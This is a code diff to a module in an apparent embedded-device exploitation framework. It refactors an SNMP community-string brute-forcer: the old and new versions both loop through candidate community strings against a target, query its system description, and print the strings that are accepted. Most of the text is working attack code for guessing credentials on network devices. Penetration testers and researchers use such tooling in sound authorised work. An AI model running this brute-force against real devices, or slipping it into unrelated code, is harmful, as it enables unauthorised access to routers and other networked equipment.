@@ -55,48 +55,33 @@ class Exploit(HTTPClient):
         return _DEFAULT_COMMUNITIES
 
     def run(self) -> None:
-        """Bruteforce SNMP community strings."""
         try:
-            from pysnmp.hlapi import (
-                CommunityData, ContextData, ObjectIdentity, ObjectType,
-                SnmpEngine, UdpTransportTarget, getCmd,
-            )
-        except ImportError:
-            print_error("pysnmp not installed  -  run: pip install pysnmp")
+            from embedxpl.core.snmp.session import SNMPSession
+            from embedxpl.core.snmp.snmp_client import SNMP_IMPORT_ERROR
+            if SNMP_IMPORT_ERROR is not None:
+                raise ImportError(str(SNMP_IMPORT_ERROR))
+        except ImportError as exc:
+            print_error(f"PySNMP unavailable: {exc}")
             return
 
         communities = self._load_communities()
-        print_status(
-            f"Testing {len(communities)} community strings against "
-            f"{self.target}:{self.port}/udp..."
-        )
-        found = []
-        for comm in communities:
-            try:
-                error_indication, error_status, _, var_binds = next(
-                    getCmd(
-                        SnmpEngine(),
-                        CommunityData(comm, mpModel=1),
-                        UdpTransportTarget(
-                            (self.target, int(self.port)),
-                            timeout=int(self.timeout),
-                            retries=0,
-                        ),
-                        ContextData(),
-                        ObjectType(ObjectIdentity("SNMPv2-MIB", "sysDescr", 0)),
-                    )
-                )
-                if not error_indication and not error_status:
-                    sys_descr = var_binds[0][1].prettyPrint() if var_binds else ""
-                    print_success(f"VALID community: '{comm}'")
-                    if sys_descr:
-                        print_success(f"  sysDescr: {sys_descr[:150]}")
-                    found.append(comm)
-            except Exception:
-                continue
+        print_status(f"Testing {len(communities)} communities on {self.target}:{self.port}")
 
+        found = []
+        for community in communities:
+            try:
+                with SNMPSession(str(self.target), self.port, community,
+                                 timeout=self.timeout) as session:
+                    error, status, _, values = session.get("1.3.6.1.2.1.1.1.0")
+                if not error and not status:
+                    print_success(f"VALID community: {community}")
+                    if values:
+                        print_success(f"sysDescr: {values[0][1]}")
+                    found.append(community)
+            except Exception as exc:
+                print_error(f"Probe failed: {exc}")
         if not found:
-            print_error(f"No valid community strings found ({len(communities)} tested)")
+            print_error("No valid communities found")
 
     @mute
     def check(self) -> bool:
